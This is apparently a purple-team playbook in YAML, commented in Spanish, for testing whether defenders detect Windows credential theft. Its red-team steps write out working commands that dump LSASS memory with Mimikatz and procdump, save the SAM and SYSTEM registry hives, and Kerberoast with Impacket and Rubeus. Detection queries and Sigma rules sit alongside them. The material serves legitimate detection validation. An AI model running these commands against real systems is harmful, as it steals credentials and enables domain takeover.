---
# ═══════════════════════════════════════════════════════════════════════════════
# 🟣 PURPLE TEAM PLAYBOOK - Credential Theft
# ═══════════════════════════════════════════════════════════════════════════════

name: Credential Theft Validation
version: "1.0"
author: Purple Team
created: 2024-01-01
updated: 2024-01-01

description: |
  Playbook para validar controles de detección contra técnicas de robo de 
  credenciales. Incluye simulación de LSASS dump, SAM extraction, y 
  credential harvesting.

objective: |
  Validar que los controles de seguridad detectan y alertan sobre intentos
  de robo de credenciales en tiempo real.

scope:
  techniques:
    - T1003.001  # LSASS Memory
    - T1003.002  # Security Account Manager
    - T1003.003  # NTDS
    - T1003.006  # DCSync
    - T1110.001  # Password Guessing
    - T1110.003  # Password Spraying
    - T1558.003  # Kerberoasting
  
  systems:
    - Windows Server 2019/2022
    - Windows 10/11 Workstations
    - Domain Controllers
  
  duration: "2-4 hours"
  
  team:
    red_team: 1-2 operators
    blue_team: 1-2 analysts
    purple_lead: 1 coordinator

prerequisites:
  - Ambiente de pruebas disponible
  - Herramientas instaladas (Atomic Red Team, Mimikatz)
  - Logging habilitado (Sysmon, PowerShell, Security)
  - Acceso a SIEM/EDR
  - Comunicación establecida entre equipos

# ═══════════════════════════════════════════════════════════════════════════════
# FASES DEL EJERCICIO
# ═══════════════════════════════════════════════════════════════════════════════

phases:
  # ─────────────────────────────────────────────────────────────────────────────
  # FASE 1: LSASS Memory Dump
  # ─────────────────────────────────────────────────────────────────────────────
  - name: "LSASS Memory Dump"
    technique_id: T1003.001
    technique_name: "OS Credential Dumping: LSASS Memory"
    tactic: Credential Access
    
    red_team_actions:
      - step: 1
        action: "Ejecutar Mimikatz sekurlsa::logonpasswords"
        command: |
          mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
        tool: mimikatz
        
      - step: 2
        action: "Ejecutar Atomic Red Team test"
        command: |
          Invoke-AtomicTest T1003.001 -TestNumbers 1,2,3
        tool: atomic-red-team
        
      - step: 3
        action: "Procdump LSASS"
        command: |
          procdump.exe -ma lsass.exe lsass.dmp
        tool: procdump
    
    blue_team_validations:
      - source: Sysmon
        event_id: 10
        description: "Process Access to LSASS"
        expected: true
        query: |
          EventCode=10 TargetImage="*lsass.exe"
        
      - source: EDR
        alert_name: "LSASS Memory Access"
        expected: true
        
      - source: Sigma
        rule: "proc_access_win_lsass_memdump.yml"
        expected: true
    
    success_criteria:
      - detection_rate: ">= 80%"
      - mttd: "<= 5 min"
      - false_positives: "<= 2"
    
    documentation:
      - Capturar screenshot de alertas
      - Documentar tiempo de detección
      - Registrar comandos ejecutados

  # ─────────────────────────────────────────────────────────────────────────────
  # FASE 2: SAM Database Extraction
  # ─────────────────────────────────────────────────────────────────────────────
  - name: "SAM Database Extraction"
    technique_id: T1003.002
    technique_name: "OS Credential Dumping: Security Account Manager"
    tactic: Credential Access
    
    red_team_actions:
      - step: 1
        action: "Registry save SAM and SYSTEM"
        command: |
          reg save HKLM\SAM C:\temp\sam.save
          reg save HKLM\SYSTEM C:\temp\system.save
        tool: native
        
      - step: 2
        action: "Atomic Red Team test"
        command: |
          Invoke-AtomicTest T1003.002
        tool: atomic-red-team
    
    blue_team_validations:
      - source: Sysmon
        event_id: 13
        description: "Registry value set"
        expected: true
        
      - source: Windows Security
        event_id: 4656
        description: "Handle to SAM requested"
        expected: true
        
      - source: Sigma
        rule: "registry_event_sam_dump.yml"
        expected: true
    
    success_criteria:
      - detection_rate: ">= 75%"
      - mttd: "<= 10 min"

  # ─────────────────────────────────────────────────────────────────────────────
  # FASE 3: Kerberoasting
  # ─────────────────────────────────────────────────────────────────────────────
  - name: "Kerberoasting"
    technique_id: T1558.003
    technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
    tactic: Credential Access
    
    red_team_actions:
      - step: 1
        action: "GetUserSPNs con Impacket"
        command: |
          GetUserSPNs.py domain/user:password -dc-ip <DC_IP> -request
        tool: impacket
        
      - step: 2
        action: "Rubeus kerberoast"
        command: |
          Rubeus.exe kerberoast /outfile:hashes.txt
        tool: rubeus
    
    blue_team_validations:
      - source: Windows Security
        event_id: 4769
        description: "Kerberos Service Ticket Request"
        expected: true
        query: |
          EventCode=4769 TicketEncryptionType=0x17
        
      - source: EDR
        alert_name: "Kerberoasting Activity"
        expected: true
    
    success_criteria:
      - detection_rate: ">= 70%"
      - mttd: "<= 15 min"

# ═══════════════════════════════════════════════════════════════════════════════
# ANÁLISIS Y REPORTE
# ═══════════════════════════════════════════════════════════════════════════════

analysis:
  gap_identification:
    - Técnicas no detectadas
    - Fuentes de detección faltantes
    - Tiempos de detección excesivos
    - Falsos positivos/negativos
  
  recommendations_template:
    - priority: critical/high/medium/low
      technique: "T1003.001"
      gap: "Descripción de la brecha"
      action: "Acción recomendada"
      owner: "Equipo responsable"
      due_date: "+X days"

reporting:
  executive_summary:
    - Estado general del ejercicio
    - Métricas clave
    - Hallazgos principales
    - Recomendaciones prioritarias
  
  technical_report:
    - Detalle por técnica
    - Comandos ejecutados
    - Detecciones validadas
    - Gaps identificados
    - Reglas sugeridas
  
  deliverables:
    - reports/exercises/credential_theft_YYYYMMDD.md
    - gaps/analysis/credential_theft_gaps.yaml
    - mitre/navigator/credential_theft_coverage.json

